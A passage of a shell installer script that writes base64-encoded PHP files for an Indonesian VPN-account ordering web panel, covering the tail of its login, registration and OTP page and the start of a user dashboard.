ICdAb3JkZXJ2cG5fYWRtaW4nKSkgPz48L3NwYW4+CiAgICAgICAgICA8L2E+CiAgICAgICAgICA8YSBocmVmPSJodHRwczovL3dhLm1lLzw/PSB1cmxlbmNvZGUocHJlZ19yZXBsYWNlKCcvW14wLTldLycsJycsIGdldFNldHRpbmcoJ2NvbnRhY3Rfd2EnLCAnMDgxMjM0NTY3ODkwJykpKSA/PiIgdGFyZ2V0PSJfYmxhbmsiIHJlbD0ibm9vcGVuZXIiIGNsYXNzPSJjb250YWN0LWxpbmsiPgogICAgICAgICAgICA8c3ZnIHdpZHRoPSIxOCIgaGVpZ2h0PSIxOCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJjdXJyZW50Q29sb3IiPjxwYXRoIGQ9Ik0xNy40NzIgMTQuMzgyYy0uMjk3LS4xNDktMS43NTgtLjg2Ny0yLjAzLS45NjctLjI3My0uMDk5LS40NzEtLjE0OC0uNjcuMTUtLjE5Ny4yOTctLjc2Ny45NjYtLjk0IDEuMTY0LS4xNzMuMTk5LS4zNDcuMjIzLS42NDQuMDc1LS4yOTctLjE1LTEuMjU1LS40NjMtMi4zOS0xLjQ3NS0uODgzLS43ODgtMS40OC0xLjc2MS0xLjY1My0yLjA1OS0uMTczLS4yOTctLjAxOC0uNDU4LjEzLS42MDYuMTM0LS4xMzMuMjk4LS4zNDcuNDQ2LS41Mi4xNDktLjE3NC4xOTgtLjI5OC4yOTgtLjQ5Ny4wOTktLjE5OC4wNS0uMzcxLS4wMjUtLjUyLS4wNzUtLjE0OS0uNjY5LTEuNjEyLS45MTYtMi4yMDctLjI0Mi0uNTc5LS40ODctLjUtLjY2OS0uNTEtLjE3My0uMDA4LS4zNzEtLjAxLS41Ny0uMDEtLjE5OCAwLS41Mi4wNzQtLjc5Mi4zNzItLjI3Mi4yOTctMS4wNCAxLjAxNi0xLjA0IDIuNDc5IDAgMS40NjIgMS4wNjUgMi44NzUgMS4yMTMgMy4wNzQuMTQ5LjE5OCAyLjA5NiAzLjIgNS4wNzcgNC40ODcuNzA5LjMwNiAxLjI2Mi40ODkgMS42OTQuNjI1LjcxMi4yMjcgMS4zNi4xOTUgMS44NzEuMTE4LjU3MS0uMDg1IDEuNzU4LS43MTkgMi4wMDYtMS40MTMuMjQ4LS42OTQuMjQ4LTEuMjg5LjE3My0xLjQxMy0uMDc0LS4xMjQtLjI3Mi0uMTk4LS41Ny0uMzQ3bS01LjQyMSA3LjQwM2gtLjAwNGE5Ljg3IDkuODcgMCAwIDEtNS4wMzEtMS4zNzhsLS4zNjEtLjIxNC0zLjc0MS45ODIuOTk4LTMuNjQ4LS4yMzUtLjM3NGE5Ljg2IDkuODYgMCAwIDEtMS41MS01LjI2Yy4wMDEtNS40NSA0LjQzNi05Ljg4NCA5Ljg4OC05Ljg4NCAyLjY0IDAgNS4xMjIgMS4wMyA2Ljk4OCAyLjg5OGE5LjgyNSA5LjgyNSAwIDAgMSAyLjg5MyA2Ljk5NGMtLjAwMyA1LjQ1LTQuNDM3IDkuODg0LTkuODg1IDkuODg0bTguNDEzLTE4LjI5N0ExMS44MTUgMTEuODE1IDAgMCAwIDEyLjA1IDBDNS40OTUgMCAuMTYgNS4zMzUuMTU3IDExLjg5MmMwIDIuMDk2LjU0NyA0LjE0MiAxLjU4OCA1Ljk0NUwuMDU3IDI0bDYuMzA1LTEuNjU0YTExLjg4MiAxMS44ODIgMCAwIDAgNS42ODMgMS40NDhoLjAwNWM2LjU1NCAwIDExLjg5LTUuMzM1IDExLjg5My0xMS44OTNhMTEuODIxIDExLjgyMSAwIDAgMC0zLjQ4LTguNDEzeiIvPjwvc3ZnPgogICAgICAgICAgICA8c3Bhbj5XaGF0c0FwcDogPD89IGh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnY29udGFjdF93YScsICcwODEyLTM0NTYtNzg5MCcpKSA/Pjwvc3Bhbj4KICAgICAgICAgIDwvYT4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CgogICAgICA8ZGl2IGNsYXNzPSJsZWZ0LWZvb3RlciI+CiAgICAgICAgPHA+QnV0dWggYmFudHVhbj8gSHVidW5naSBhZG1pbiBrYW1pIG1lbGFsdWkgVGVsZWdyYW0gYXRhdSBXaGF0c0FwcCBkaSBhdGFzLiBSZXNwb25zZSBjZXBhdCAyNC83LjwvcD4KICAgICAgPC9kaXY+CgogICAgPC9kaXY+CiAgPC9kaXY+PGRpdiBjbGFzcz0icmlnaHQtcGFuZWwiPgogICAgPGRpdiBjbGFzcz0iYXV0aC13cmFwIj4KICAgICAgPGRpdiBjbGFzcz0iYXV0aC1jYXJkIj4KCiAgICAgICAgPGRpdiBjbGFzcz0iYXV0aC1oZWFkZXIiPgogICAgICAgICAgPGgyIGlkPSJhdXRoVGl0bGUiPlNlbGFtYXQgRGF0YW5nPC9oMj4KICAgICAgICAgIDxwIGlkPSJhdXRoU3ViIj5NYXN1ayBrZSBha3VuIDw/PSRhcHBOYW1lPz4ga2FtdTwvcD4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0idGFicyI+CiAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJ0YWItYnRuIGFjdGl2ZSIgaWQ9ImJ0bkxvZ2luIiBvbmNsaWNrPSJzaG93VGFiKCdsb2dpbicpIj5NYXN1azwvYnV0dG9uPgogICAgICAgICAgPGJ1dHRvbiBjbGFzcz0idGFiLWJ0biIgaWQ9ImJ0blJlZyIgb25jbGljaz0ic2hvd1RhYigncmVnaXN0ZXInKSI+RGFmdGFyPC9idXR0b24+CiAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJ0YWItYnRuIiBpZD0iYnRuT3RwIiBvbmNsaWNrPSJzaG93VGFiKCdvdHAnKSIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+VmVyaWZpa2FzaTwvYnV0dG9uPgogICAgICAgICAgPGJ1dHRvbiBjbGFzcz0idGFiLWJ0biIgaWQ9ImJ0bkZvcmdvdCIgb25jbGljaz0ic2hvd1RhYignZm9yZ290JykiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPkx1cGEgUGFzc3dvcmQ8L2J1dHRvbj4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPD9waHAgaWYoJGVycm9yKTo/PgogICAgICAgIDxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LWVycm9yIj4KICAgICAgICAgIAogICAgICAgICAgPHNwYW4+PD89JGVycm9yPz48L3NwYW4+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPD9waHAgZW5kaWY7Pz4KCiAgICAgICAgPD9waHAgaWYoJHN1Y2Nlc3MpOj8+CiAgICAgICAgPGRpdiBjbGFzcz0iYWxlcnQgYWxlcnQtc3VjY2VzcyI+CiAgICAgICAgICAKICAgICAgICAgIDxzcGFuPjw/PSRzdWNjZXNzPz48L3NwYW4+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPD9waHAgZW5kaWY7Pz4KCiAgICAgICAgPCEtLSBMT0dJTiAtLT4KICAgICAgICA8ZGl2IGNsYXNzPSJ0YWItY29udGVudCBhY3RpdmUiIGlkPSJ0YWItbG9naW4iPgogICAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0ibG9naW4iPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICA8bGFiZWw+VXNlcm5hbWUgLyBFbWFpbDwvbGFiZWw+CiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJuYW1lIiBwbGFjZWhvbGRlcj0iTWFzdWtrYW4gdXNlcm5hbWUgYXRhdSBlbWFpbCIgcmVxdWlyZWQgYXV0b2NvbXBsZXRlPSJ1c2VybmFtZSI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICA8bGFiZWw+UGFzc3dvcmQ8L2xhYmVsPgogICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSLigKLigKLigKLigKLigKLigKLigKLigKIiIHJlcXVpcmVkIGF1dG9jb21wbGV0ZT0iY3VycmVudC1wYXNzd29yZCI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+TWFzdWsgU2VrYXJhbmc8L2J1dHRvbj4KICAgICAgICAgIDxkaXYgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyO21hcmdpbi10b3A6Ljg1cmVtOyI+CiAgICAgICAgICAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgb25jbGljaz0ic2hvd1RhYignZm9yZ290Jyk7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvcmdvdEVtYWlsJykudmFsdWU9ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignW25hbWU9dXNlcm5hbWVdJyk/LnZhbHVlfHwnJyIgc3R5bGU9ImNvbG9yOiM0NzU1Njk7Zm9udC1zaXplOi44cmVtO3RleHQtZGVjb3JhdGlvbjpub25lO3RyYW5zaXRpb246Y29sb3IgLjJzIiBvbm1vdXNlb3Zlcj0idGhpcy5zdHlsZS5jb2xvcj0nIzYwYTVmYSciIG9ubW91c2VvdXQ9InRoaXMuc3R5bGUuY29sb3I9JyM0NzU1NjknIj5MdXBhIFBhc3N3b3JkPzwvYT4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9mb3JtPgogICAgICAgIDwvZGl2PgoKICAgICAgICA8IS0tIFJFR0lTVEVSIC0tPgogICAgICAgIDxkaXYgY2xhc3M9InRhYi1jb250ZW50IiBpZD0idGFiLXJlZ2lzdGVyIj4KICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgaWQ9InJlZ0Zvcm0iPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJyZWdpc3RlciI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgIDxsYWJlbD5Vc2VybmFtZTwvbGFiZWw+CiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InJlZ191c2VybmFtZSIgcGxhY2Vob2xkZXI9IkJ1YXQgdXNlcm5hbWUgdW5payIgcmVxdWlyZWQgYXV0b2NvbXBsZXRlPSJ1c2VybmFtZSI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICA8bGFiZWw+RW1haWw8L2xhYmVsPgogICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJlbWFpbCIgbmFtZT0icmVnX2VtYWlsIiBpZD0icmVnRW1haWwiIHBsYWNlaG9sZGVyPSJlbWFpbEBrYW11LmNvbSIgcmVxdWlyZWQgYXV0b2NvbXBsZXRlPSJlbWFpbCI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICA8bGFiZWw+UGFzc3dvcmQ8L2xhYmVsPgogICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icmVnX3Bhc3N3b3JkIiBwbGFjZWhvbGRlcj0iTWluaW1hbCA2IGthcmFrdGVyIiByZXF1aXJlZCBhdXRvY29tcGxldGU9Im5ldy1wYXNzd29yZCI+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICA8bGFiZWw+S29uZmlybWFzaSBQYXNzd29yZDwvbGFiZWw+CiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJyZWdfY29uZmlybSIgcGxhY2Vob2xkZXI9IlVsYW5naSBwYXNzd29yZCIgcmVxdWlyZWQgYXV0b2NvbXBsZXRlPSJuZXctcGFzc3dvcmQiPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiPkJ1YXQgQWt1biBCYXJ1PC9idXR0b24+CiAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgPC9kaXY+CgogICAgICAgIDwhLS0gT1RQIFZFUklGWSAtLT4KICAgICAgICA8ZGl2IGNsYXNzPSJ0YWItY29udGVudCIgaWQ9InRhYi1vdHAiPgogICAgICAgICAgPHAgY2xhc3M9Im90cC1ub3RlIj5NYXN1a2thbiBrb2RlIDYgZGlnaXQgeWFuZyB0ZWxhaCBkaWtpcmltIGtlIGVtYWlsIGthbXUuPC9wPgogICAgICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0idmVyaWZ5X290cCI+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im90cF9lbWFpbCIgaWQ9Im90cEVtYWlsIiB2YWx1ZT0iIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgICAgPGxhYmVsPktvZGUgT1RQPC9sYWJlbD4KICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ibnVtYmVyIiBuYW1lPSJvdHBfY29kZSIgcGxhY2Vob2xkZXI9IjAwMDAwMCIgbWF4bGVuZ3RoPSI2IgogICAgICAgICAgICAgICAgICAgICBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7Zm9udC1zaXplOjEuNXJlbTtmb250LXdlaWdodDo3MDA7bGV0dGVyLXNwYWNpbmc6LjNlbTsiIHJlcXVpcmVkPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiPlZlcmlmaWthc2kgU2VrYXJhbmc8L2J1dHRvbj4KICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgIDxkaXYgY2xhc3M9ImRpdmlkZXIiPmF0YXU8L2Rpdj4KICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCI+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InJlc2VuZF9vdHAiPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJyZXNlbmRfZW1haWwiIGlkPSJyZXNlbmRFbWFpbCIgdmFsdWU9IiI+CiAgICAgICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zZWNvbmRhcnkiPktpcmltIFVsYW5nIE9UUDwvYnV0dG9uPgogICAgICAgICAgPC9mb3JtPgogICAgICAgIDwvZGl2PgoKICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICA8L2Rpdj4KCjwvZGl2PgoKPHNjcmlwdD4KZnVuY3Rpb24gc2hvd1RhYih0KXsKICAvLyBVcGRhdGUgdGFiIGNvbnRlbnRzCiAgWydsb2dpbicsJ3JlZ2lzdGVyJywnb3RwJywnZm9yZ290J10uZm9yRWFjaChmdW5jdGlvbihuKXsKICAgIHZhciBlbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0YWItJytuKTsKICAgIGlmKGVsKSBlbC5jbGFzc0xpc3QudG9nZ2xlKCdhY3RpdmUnLCBuPT09dCk7CiAgfSk7CiAgLy8gVXBkYXRlIHRhYiBidXR0b25zIChtYXAgJ3JlZ2lzdGVyJy0+J3JlZycsICdsb2dpbictPidsb2dpbicsICdvdHAnLT4nb3RwJykKICB2YXIgYnRuTWFwID0ge2xvZ2luOidMb2dpbicsIHJlZ2lzdGVyOidSZWcnLCBvdHA6J090cCcsIGZvcmdvdDonRm9yZ290J307CiAgWydMb2dpbicsJ1JlZycsJ090cCcsJ0ZvcmdvdCddLmZvckVhY2goZnVuY3Rpb24obil7CiAgICB2YXIgYiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdidG4nK24pOwogICAgaWYoYikgewogICAgICBiLmNsYXNzTGlzdC50b2dnbGUoJ2FjdGl2ZScsIGJ0bk1hcFt0XT09PW4pOwogICAgICBpZihuPT09J090cCcpIGIuc3R5bGUuZGlzcGxheSA9ICh0PT09J290cCd8fHQ9PT0nZm9yZ290JykgPyAnJyA6ICdub25lJzsKICAgICAgaWYobj09PSdGb3Jnb3QnKSBiLnN0eWxlLmRpc3BsYXkgPSAodD09PSdmb3Jnb3QnKSA/ICcnIDogJ25vbmUnOwogICAgICBpZihuPT09J0xvZ2luJ3x8bj09PSdSZWcnKSBiLnN0eWxlLmRpc3BsYXkgPSAodD09PSdmb3Jnb3QnKSA/ICdub25lJyA6ICcnOwogICAgfQogIH0pOwogIC8vIFVwZGF0ZSBoZWFkZXIgdGV4dAogIHZhciB0aXRsZXMgPSB7bG9naW46J1NlbGFtYXQgRGF0YW5nIEtlbWJhbGknLCByZWdpc3RlcjonQnVhdCBBa3VuIEJhcnUnLCBvdHA6J1ZlcmlmaWthc2kgRW1haWwnLCBmb3Jnb3Q6J0x1cGEgUGFzc3dvcmQnfTsKICB2YXIgc3VicyA9IHtsb2dpbjonTWFzdWsga2UgYWt1biA8Pz0kYXBwTmFtZT8+IGthbXUnLCByZWdpc3RlcjonRGFmdGFyIGRhbiBuaWttYXRpIFZQTiBwcmVtaXVtJywgb3RwOidLb25maXJtYXNpIGtvZGUgT1RQIGRhcmkgZW1haWwnLCBmb3Jnb3Q6J1Jlc2V0IHBhc3N3b3JkIGFrdW4gQW5kYSd9OwogIHZhciB0RWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXV0aFRpdGxlJyk7CiAgdmFyIHNFbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdXRoU3ViJyk7CiAgaWYodEVsKSB0RWwudGV4dENvbnRlbnQgPSB0aXRsZXNbdF0gfHwgdGl0bGVzWydsb2dpbiddOwogIGlmKHNFbCkgc0VsLnRleHRDb250ZW50ID0gc3Vic1t0XSB8fCBzdWJzWydsb2dpbiddOwp9Cjw/cGhwIGlmKHN0cnBvcygkc3VjY2VzcywncmVzZXQgcGFzc3dvcmQnKSE9PWZhbHNlKTo/PgpzaG93VGFiKCdmb3Jnb3QnKTsKZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2J0bk90cCcpLnN0eWxlLmRpc3BsYXk9Jyc7CmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdidG5Gb3Jnb3QnKS5zdHlsZS5kaXNwbGF5PScnOwo8P3BocCBlbmRpZjs/Pgo8P3BocCBpZihzdHJwb3MoJHN1Y2Nlc3MsJ09UUCcpIT09ZmFsc2V8fHN0cnBvcygkc3VjY2VzcywnQWt1biBiZXJoYXNpbCcpIT09ZmFsc2UpOj8+CnNob3dUYWIoJ290cCcpOwpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYnRuT3RwJykuc3R5bGUuZGlzcGxheT0nJzsKPD9waHAgZW5kaWY7Pz4KPD9waHAgaWYoc3RycG9zKCRzdWNjZXNzLCdkaXZlcmlmaWthc2knKSE9PWZhbHNlfHxzdHJwb3MoJHN1Y2Nlc3MsJ1Bhc3N3b3JkIGJlcmhhc2lsJykhPT1mYWxzZSk6Pz5zaG93VGFiKCdsb2dpbicpOzw/cGhwIGVuZGlmOz8+Ci8vIEF1dG8tZmlsbCBPVFAgZW1haWwgZnJvbSByZWdpc3RlcgovLyBBdXRvLWZpbGwgcmVzZXQgZW1haWwgZnJvbSBmb3Jnb3QgZm9ybQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9yZ290Rm9ybScpPy5hZGRFdmVudExpc3RlbmVyKCdzdWJtaXQnLCBmdW5jdGlvbigpewogIHZhciBlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvcmdvdEVtYWlsJykudmFsdWU7CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc2V0RW1haWwnKS52YWx1ZSA9IGU7Cn0pOwovLyBBdXRvLWZpbGwgT1RQIGVtYWlsIGZyb20gcmVnaXN0ZXIKZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlZ0Zvcm0nKT8uYWRkRXZlbnRMaXN0ZW5lcignc3VibWl0JyxmdW5jdGlvbigpewogIHZhciBlPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZWdFbWFpbCcpLnZhbHVlOwogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvdHBFbWFpbCcpLnZhbHVlPWU7CiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc2VuZEVtYWlsJykudmFsdWU9ZTsKfSk7Cjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4=" | base64 -d > "$DIR"/index.php



    # dashboard.php



    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy9pbmNsdWRlcy9jb25maWcucGhwJzsKJHNlc3Npb24gPSByZXF1aXJlTG9naW4oKTsKJGRiID0gZ2V0REIoKTsKCiR1c2VySWQgPSAkc2Vzc2lvblsndXNlcl9pZCddOwokdXNlcm5hbWUgPSAkc2Vzc2lvblsndXNlcm5hbWUnXTsKJHJvbGUgPSAkc2Vzc2lvblsncm9sZSddOwoKLy8gQW1iaWwgZGF0YSB1c2VyIGZyZXNoCiR1ID0gJGRiLT5wcmVwYXJlKCJTRUxFQ1QgKiBGUk9NIHVzZXJzIFdIRVJFIGlkPT8iKTsKJHUtPmV4ZWN1dGUoWyR1c2VySWRdKTsgJHVzZXIgPSAkdS0+ZmV0Y2goKTsKCi8vIFN0YXRpc3RpawokdG90YWxBa3VuID0gJGRiLT5wcmVwYXJlKCJTRUxFQ1QgQ09VTlQoKikgRlJPTSB2cG5fYWNjb3VudHMgV0hFUkUgdXNlcl9pZD0/IEFORCBzdGF0dXM9J2FjdGl2ZSciKTsKJHRvdGFsQWt1bi0+ZXhlY3V0ZShbJHVzZXJJZF0pOyAkdG90YWxBa3VuID0gJHRvdGFsQWt1bi0+ZmV0Y2hDb2x1bW4oKTsKCiR0b3RhbFRyeCA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUIENPVU5UKCopIEZST00gdHJhbnNhY3Rpb25zIFdIRVJFIHVzZXJfaWQ9PyIpOwokdG90YWxUcngtPmV4ZWN1dGUoWyR1c2VySWRdKTsgJHRvdGFsVHJ4ID0gJHRvdGFsVHJ4LT5mZXRjaENvbHVtbigpOwoKJHRvdGFsVG9wdXAgPSAkZGItPnByZXBhcmUoIlNFTEVDVCBDT0FMRVNDRShTVU0oYW1vdW50KSwwKSBGUk9NIHRyYW5zYWN0aW9ucyBXSEVSRSB1c2VyX2lkPT8gQU5EIHR5cGU9J3RvcHVwJyBBTkQgc3RhdHVzPSdzdWNjZXNzJyIpOwokdG90YWxUb3B1cC0+ZXhlY3V0ZShbJHVzZXJJZF0pOyAkdG90YWxUb3B1cCA9ICR0b3RhbFRvcHVwLT5mZXRjaENvbHVtbigpOwoKLy8gQWt1biBha3RpZiB0ZXJiYXJ1CiRha3VucyA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUIHZhLiosIHMubmFtYV9zZXJ2ZXIsIHMubG9rYXNpLCBzLmZsYWcgRlJPTSB2cG5fYWNjb3VudHMgdmEgCiAgICBKT0lOIHNlcnZlcnMgcyBPTiB2YS5zZXJ2ZXJfaWQ9cy5pZCAKICAgIFdIRVJFIHZhLnVzZXJfaWQ9PyBBTkQgdmEuc3RhdHVzPSdhY3RpdmUnIE9SREVSIEJZIHZhLmNyZWF0ZWRfYXQgREVTQyBMSU1JVCA1Iik7CiRha3Vucy0+ZXhlY3V0ZShbJHVzZXJJZF0pOyAkYWt1bnMgPSAkYWt1bnMtPmZldGNoQWxsKCk7CgovLyBUcmFuc2Frc2kgdGVyYmFydQokdHJ4cyA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB0cmFuc2FjdGlvbnMgV0hFUkUgdXNlcl9pZD0/IE9SREVSIEJZIGNyZWF0ZWRfYXQgREVTQyBMSU1JVCA1Iik7CiR0cnhzLT5leGVjdXRlKFskdXNlcklkXSk7ICR0cnhzID0gJHRyeHMtPmZldGNoQWxsKCk7CgovLyBTZXJ2ZXJzIHVudHVrIG9yZGVyCiRzZXJ2ZXJzID0gJGRiLT5xdWVyeSgiU0VMRUNUICogRlJPTSBzZXJ2ZXJzIFdIRVJFIHN0YXR1cz0ncmVhZHknIE9SREVSIEJZIG5hbWFfc2VydmVyIiktPmZldGNoQWxsKCk7CgokYXBwTmFtZSA9IGdldFNldHRpbmcoJ2FwcF9uYW1lJywnT3JkZXJWUE4nKTsKJGFwcExvZ28gPSBnZXRTZXR0aW5nKCdhcHBfbG9nbycsJ1tTSUddJyk7CiRjb250YWN0V2EgPSBnZXRTZXR0aW5nKCdjb250YWN0X3dhJyk7CiRjb250YWN0VGcgPSBnZXRTZXR0aW5nKCdjb250YWN0X3RnJyk7CgovLyBUcmlhbCBzdWRhaCBkaXBha2FpIGhhcmkgaW5pPwokdHJpYWxVc2VkID0gJGRiLT5wcmVwYXJlKCJTRUxFQ1QgQ09VTlQoKikgRlJPTSB2cG5fYWNjb3VudHMgV0hFUkUgdXNlcl9pZD0/IEFORCBpc190cmlhbD0xIEFORCBEQVRFKGNyZWF0ZWRfYXQpPUNVUkRBVEUoKSIpOwokdHJpYWxVc2VkLT5leGVjdXRlKFskdXNlcklkXSk7ICR0cmlhbFVzZWQgPSAoaW50KSR0cmlhbFVzZWQtPmZldGNoQ29sdW1uKCk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJpZCI+CjxoZWFkPgo8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsaW5pdGlhbC1zY2FsZT0xIj4KPHRpdGxlPjw/PSRhcHBOYW1lPz4g4oCUIERhc2hib2FyZDwvdGl0bGU+CjxzdHlsZT4KICAgICAgICA6cm9vdCB7CiAgICAgICAgICAgIC0tYmc6ICAgICAgICAgICAjMDgwYzE0OwogICAgICAgICAgICAtLWNhcmQ6ICAgICAgICAgIzExMTgyNzsKICAgICAgICAgICAgLS1jYXJkLWhvdmVyOiAgICMxNjFlMmU7CiAgICAgICAgICAgIC0tYm9yZGVyOiAgICAgICAjMWUyOTNiOwogICAgICAgICAgICAtLWJvcmRlci1saWdodDogIzI2MzM0ODsKICAgICAgICAgICAgLS10ZXh0OiAgICAgICAgICNlMmU4ZjA7CiAgICAgICAgICAgIC0tdGV4dC1kaW06ICAgICAjOTRhM2I4OwogICAgICAgICAgICAtLW11dGVkOiAgICAgICAgIzY0NzQ4YjsKICAgICAgICAgICAgLS1wcmltYXJ5OiAgICAgICM2MzY2ZjE7CiAgICAgICAgICAgIC0tcHJpbWFyeS1kaW06ICAjNGY0NmU1OwogICAgICAgICAgICAtLWFjY2VudDogICAgICAgIzgxOGNmODsKICAgICAgICAgICAgLS1zdWNjZXNzOiAgICAgICMxMGI5ODE7CiAgICAgICAgICAgIC0td2FybmluZzogICAgICAjZjU5ZTBiOwogICAgICAgICAgICAtLWRhbmdlcjogICAgICAgI2VmNDQ0NDsKICAgICAgICAgICAgLS1pbmZvOiAgICAgICAgICMzYjgyZjY7CiAgICAgICAgICAgIC0tcHVycGxlOiAgICAgICAjOGI1Y2Y2OwogICAgICAgICAgICAtLWN5YW46ICAgICAgICAgIzA2YjZkNDsKICAgICAgICAgICAgLS1yYWRpdXM6ICAgICAgIDEycHg7CiAgICAgICAgICAgIC0tcmFkaXVzLXNtOiAgICA4cHg7CiAgICAgICAgICAgIC0tc2hhZG93OiAgICAgICAwIDFweCAzcHggcmdiYSgwLDAsMCwuMyk7CiAgICAgICAgICAgIC0tc2hhZG93LWxnOiAgICAwIDEwcHggMjVweCByZ2JhKDAsMCwwLC40KTsKICAgICAgICAgICAgLS10cmFuc2l0aW9uOiAgIDAuMnMgY3ViaWMtYmV6aWVyKC40LDAsLjIsMSk7CiAgICAgICAgfQogICAgICAgICogeyBib3gtc2l6aW5nOmJvcmRlci1ib3g7IG1hcmdpbjowOyBwYWRkaW5nOjA7IH0KICAgICAgICBib2R5IHsKICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdJbnRlcicsJ1NlZ29lIFVJJyxzeXN0ZW0tdWksLWFwcGxlLXN5c3RlbSxzYW5zLXNlcmlmOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1iZyk7CiAgICAgICAgICAgIGNvbG9yOiB2YXIoLS10ZXh0KTsKICAgICAgICAgICAgbWluLWhlaWdodDogMTAwdmg7CiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxLjY7CiAgICAgICAgICAgIC13ZWJraXQtZm9udC1zbW9vdGhpbmc6IGFudGlhbGlhc2VkOwogICAgICAgIH0KICAgICAgICBhIHsgY29sb3I6IHZhcigtLWFjY2V